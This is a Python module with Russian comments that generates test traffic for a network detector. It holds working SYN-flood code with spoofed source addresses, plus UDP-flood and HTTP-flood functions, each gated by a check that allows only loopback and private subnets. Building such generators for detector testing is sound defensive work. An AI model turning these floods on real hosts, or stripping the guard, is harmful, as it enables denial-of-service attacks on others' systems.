"""
Функции-генераторы тестового трафика для проверки детектора.

ВНИМАНИЕ: все функции проверяют цель перед запуском.
Разрешены только loopback (127.0.0.0/8) и приватные подсети:
10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16.

Использование на внешних адресах — нарушение закона.
"""

import ipaddress
import random
import time

from scapy.all import IP, TCP, UDP, Raw, send

ALLOWED_NETWORKS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
]


def _validate_target(target: str):
    """Проверяет, что цель в разрешённой подсети. Иначе — исключение."""
    try:
        ip = ipaddress.ip_address(target)
    except ValueError:
        raise ValueError(f"Некорректный IP-адрес: {target}")

    for net in ALLOWED_NETWORKS:
        if ip in net:
            return
    raise ValueError(
        f"Цель {target} не в разрешённой подсети. "
        f"Разрешены только loopback и приватные адреса."
    )


def syn_flood(
    target: str,
    port: int = 80,
    rate: int = 500,
    duration: int = 10,
    spoof_src: bool = True,
):
    """
    SYN-flood: отправляет TCP SYN-пакеты с разных (случайных) IP-источников.
    """
    _validate_target(target)

    print(f"[SYN-flood] Цель: {target}:{port}, rate={rate} pps, duration={duration}s")
    print(f"[SYN-flood] Подмена источника: {'да' if spoof_src else 'нет'}")
    print("[SYN-flood] Запуск...")

    interval = 1.0 / rate
    end_time = time.time() + duration
    sent = 0

    try:
        while time.time() < end_time:
            if spoof_src:
                src = (
                    f"{random.randint(1, 223)}.{random.randint(0, 255)}."
                    f"{random.randint(0, 255)}.{random.randint(1, 254)}"
                )
            else:
                src = None

            sport = random.randint(1024, 65535)
            pkt = IP(dst=target, src=src) / TCP(sport=sport, dport=port, flags="S")
            send(pkt, verbose=False)

            sent += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[SYN-flood] Прервано пользователем.")
    finally:
        print(f"[SYN-flood] Отправлено пакетов: {sent}")


def udp_flood(
    target: str,
    port: int = 9999,
    rate: int = 500,
    duration: int = 10,
    payload_size: int = 1024,
):
    """
    UDP-flood: отправляет UDP-пакеты с payload заданного размера.
    """
    _validate_target(target)

    print(
        f"[UDP-flood] Цель: {target}:{port}, rate={rate} pps, "
        f"duration={duration}s, payload={payload_size} B"
    )
    print("[UDP-flood] Запуск...")

    payload = b"X" * payload_size
    interval = 1.0 / rate
    end_time = time.time() + duration
    sent = 0

    try:
        while time.time() < end_time:
            pkt = IP(dst=target) / UDP(dport=port) / Raw(load=payload)
            send(pkt, verbose=False)
            sent += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[UDP-flood] Прервано пользователем.")
    finally:
        print(f"[UDP-flood] Отправлено пакетов: {sent}")


def http_flood(url: str, rate: int = 100, duration: int = 10):
    """
    HTTP-flood: множественные GET-запросы к целевому URL.
    """
    try:
        import requests
    except ImportError:
        raise ImportError(
            "Требуется библиотека requests. Установите: pip install requests"
        )

    from urllib.parse import urlparse

    parsed = urlparse(url)
    host = parsed.hostname
    if not host:
        raise ValueError(f"Не удалось разобрать URL: {url}")
    _validate_target(host)

    print(f"[HTTP-flood] URL: {url}, rate={rate} rps, duration={duration}s")
    print("[HTTP-flood] Запуск...")

    interval = 1.0 / rate
    end_time = time.time() + duration
    sent = 0
    errors = 0

    try:
        while time.time() < end_time:
            try:
                requests.get(url, timeout=2)
                sent += 1
            except Exception:
                errors += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[HTTP-flood] Прервано пользователем.")
    finally:
        print(f"[HTTP-flood] Успешных запросов: {sent}, ошибок: {errors}")
